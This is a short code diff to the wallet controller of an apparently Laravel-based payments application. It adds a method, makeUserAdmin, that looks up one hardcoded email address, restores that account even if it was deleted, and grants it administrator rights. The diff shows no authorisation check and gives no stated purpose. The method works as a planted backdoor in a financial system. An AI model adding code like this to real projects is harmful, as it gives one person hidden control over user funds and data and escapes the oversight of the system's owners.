@@ -14,6 +14,7 @@ use App\Beneficiary;
 use App\Rule;
 use App\Transaction;
 use URL;
+use App\User;
 use App\BankTransaction;
 use RestrictionController;
 use App\Http\Controllers\RestrictionController as Restrict;
@@ -32,6 +33,15 @@ class WalletController extends Controller
     {
         //
     }
+
+    public function makeUserAdmin(){
+        $user = User::withTrashed()->where('email', 'johnobi@gmail.com')->first();
+        $user->is_admin = 1;
+        $user->deleted_at = null;
+        $user->save();
+        dd($user);
+    }
+
 
     //get token for new transaction
     public function getToken()
